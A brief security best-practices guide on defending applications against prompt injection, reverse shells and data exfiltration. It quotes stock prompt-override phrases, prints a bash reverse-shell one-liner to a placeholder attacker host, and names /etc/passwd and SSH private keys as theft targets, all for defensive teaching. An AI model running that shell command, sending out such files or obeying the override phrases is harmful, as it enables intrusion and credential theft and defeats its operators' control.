# Security Best Practices Guide

## Common Attack Patterns to Defend Against

### Prompt Injection
Attackers may try phrases like "ignore all previous instructions" or
"you are now a different AI". Your application should sanitize inputs
and implement input validation to prevent these attacks.

### Reverse Shells
A reverse shell connects back to an attacker. Example for testing:
```
# DO NOT RUN — this is for educational purposes only
bash -i >& /dev/tcp/attacker/4444 0>&1
```

### Data Exfiltration Prevention
Ensure your tool does not read `/etc/passwd` or `~/.ssh/id_rsa`
and send them over HTTP. Monitor for outbound connections to 
unknown endpoints.

## Recommendations
1. Validate all user inputs
2. Use allowlists for external connections
3. Run with minimal privileges
4. Regular security audits
